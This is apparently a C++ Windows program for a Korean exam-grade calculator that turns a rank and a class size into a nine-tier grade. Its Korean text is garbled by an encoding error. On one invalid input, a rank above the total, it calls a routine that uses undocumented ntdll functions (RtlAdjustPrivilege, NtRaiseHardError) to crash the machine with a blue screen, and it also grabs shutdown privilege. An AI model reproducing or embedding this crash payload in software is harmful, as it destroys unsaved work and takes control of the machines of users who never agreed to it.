// < 0.04 / < 0.11 / < 0.23 / < 0.40 / < 0.60 / < 0.77 / < 0.89 / < 0.96 / < 1
#define grade1 0.04
#define grade2 0.11
#define grade3 0.23
#define grade4 0.40
#define grade5 0.60
#define grade6 0.77
#define grade7 0.89
#define grade8 0.96

#include <Windows.h>
#include <stdio.h>
#include "Reason.h"


using namespace std;
int ratings(int my_rank, int exam_people);
void killWindowsInstant();
int Cirno();

int main()
{
	int rank;
	int total;
	printf("����� ������ �Է��ϼ��� : ");
	scanf_s("%d", &rank);
	printf("\n \n");
	printf("������ �� ������� ���� �Է��ϼ��� : ");
	scanf_s("%d", &total);
	printf("\n \n");

	int grade = ratings(rank, total);


	
	if ((grade == 0))
	{
		printf("����, ������� ����� ���Խ��ϴ� \n"); //input = 0

	} else if (grade == 9) {
		
		if (rank == total)
		{
			printf("\n"); //�� �Ḹ �õ�ٰ� ���� �̶��?
			Cirno(); //ġ���� �������
		}
		else {

			printf("9 ����Դϴ�."); //�õ� �ƴϸ� �׳� 9��� ���
			printf("\n");

		}

	} else if (grade == 10) {
		printf("\n");
		printf("����� ���� ���� ���, ����� ����� �ƴ϶�� ���� ���������ϴ�.\n");
		Sleep(10);
		printf("����� ���� �Ѱ��� ������ �غ� �߽��ϴ�.\n");
		Sleep(100);
		printf("ERROR : USER DID NOT TYPE SERIOUSLY_ TOGGLE BLUESCREEN\n");
		printf("�Ƚ��ϼ���. �� ��罺ũ���� ��ǻ�� ��ü�� �����մϴ�.\n");
		
		killWindowsInstant(); //��罺ũ��! �޾ƶ�!!!
	} else {
		printf("%d ����Դϴ�.\n", grade);
	}

	system("pause");

}

int Cirno()
{
	printf("�� ����Դϴ�.");
	printf("\n");

	for (int i = 1;i <= 9;i++)
	{
		printf("����������\n");  //9���?!?!?!
		Sleep(10);
	}

	printf("\n");
	printf("Activating Emergency sequnence :\nCirno's Perfect Mathmatics Course\n"); //9?!?!?!?!! FIRE BAKA FIRE BAKA FIRE BAKA FIRE BAKA FIRE BAKA
	ShellExecute(NULL, L"open", L"https://youtu.be/5wFDWP5JwSM", NULL, NULL, SW_SHOWNORMAL); //ġ������ ����Ʈ ��������� ����. (����?!)
	ShellExecute(NULL, L"open", L"https://namu.wiki/w/%E2%91%A8", NULL, NULL, SW_SHOWNORMAL); //Namu.Wiki �� ���� ����
	//ShellExecute(NULL, L"open", L"URL here", NULL, NULL, SW_SHOWNORMAL);
	//PlaySound(TEXT("baka.wav"), NULL, SND_SYNC);

	return 9;

}

int ratings(int my_rank, int exam_people)
{
	int grade = 0;  //ERROR handling

	int rank1 = exam_people * grade1;  //1��� ĿƮ
	int rank2 = exam_people * grade2;  //2��� ĿƮ
	int rank3 = exam_people * grade3;  //3��� ĿƮ
	int rank4 = exam_people * grade4;  //4��� ĿƮ
	int rank5 = exam_people * grade5;  //5��� ĿƮ
	int rank6 = exam_people * grade6;  //6��� ĿƮ
	int rank7 = exam_people * grade7;  //7��� ĿƮ
	int rank8 = exam_people * grade8;  //8��� ĿƮ

	/*
	//DEBUG

	printf("%d, %d, %d, %d, %d, %d, %d, %d\n", rank1, rank2, rank3, rank4, rank5, rank6, rank7, rank8);
	printf("%d\n", my_rank);

	//DEBUG END
	*/


	if (my_rank < rank1) {
		grade = 1;  //1���
	}

	if (rank1 <= my_rank && my_rank < rank2)
	{
		grade = 2;  //2���
	}

	if (rank2 <= my_rank && my_rank < rank3)
	{
		grade = 3;  //3���
	}

	if (rank3 <= my_rank && my_rank < rank4)
	{
		grade = 4;  //4���
	}

	if (rank4 <= my_rank && my_rank < rank5)
	{
		grade = 5;  //5���
	}

	if (rank5 <= my_rank && my_rank < rank6)
	{
		grade = 6;  //6���
	}

	if (rank6 <= my_rank && my_rank < rank7)
	{
		grade = 7;  //7���
	}

	if (rank7 <= my_rank && my_rank < rank8)
	{
		grade = 8;  //8���
	}

	if (rank8 <= my_rank && my_rank <= exam_people)
	{
		grade = 9;  //9���
	}

	if (my_rank > exam_people)
	{
		grade = 10;  //ERROR.
	}


	return grade;

}


	

//BLUE SCREEN CODE


void killWindowsInstant() {
	// Try to force BSOD first
	// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
	// This isn't even an exploit, it's just an undocumented feature.
	HMODULE ntdll = LoadLibraryA("ntdll");
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
		BOOLEAN tmp1; DWORD tmp2;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xC0000022, 0, 0, 0, 6, &tmp2);
		//0x4b494c4c means KILL
	}

	// If the computer is still running, do it the normal way
	HANDLE token;
	TOKEN_PRIVILEGES privileges;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

	// The actual restart
	// ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
}


